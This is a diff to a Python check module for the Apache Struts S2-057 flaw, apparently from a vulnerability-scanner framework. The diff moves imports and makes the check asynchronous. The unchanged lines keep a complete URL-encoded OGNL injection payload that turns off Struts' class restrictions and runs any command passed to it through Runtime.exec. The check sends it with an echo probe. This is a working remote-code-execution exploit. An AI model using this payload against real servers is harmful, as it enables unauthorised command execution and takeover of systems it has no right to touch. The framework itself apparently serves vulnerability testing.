@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.encode import urlencode
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.encode import urlencode
+from app.lib.common import get_capta, get_useragent
 
 class S2_057_BaseVerify:
     def __init__(self, url):
@@ -22,7 +22,7 @@ class S2_057_BaseVerify:
         }
         self.payload = '''/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/actionChain1.action'''
     
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -32,15 +32,12 @@ class S2_057_BaseVerify:
         """
         
         try:
-            check_req = request.get(self.url + self.payload.format(cmd = urlencode('echo ' + self.capta)), headers = self.headers)
-            if self.capta in check_req.text and len(check_req.text) < 100:
+            check_req = await request.get(self.url + self.payload.format(cmd = urlencode('echo ' + self.capta)), headers = self.headers)
+            if self.capta in await check_req.text() and len(await check_req.text()) < 100:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
     
 if  __name__ == "__main__":
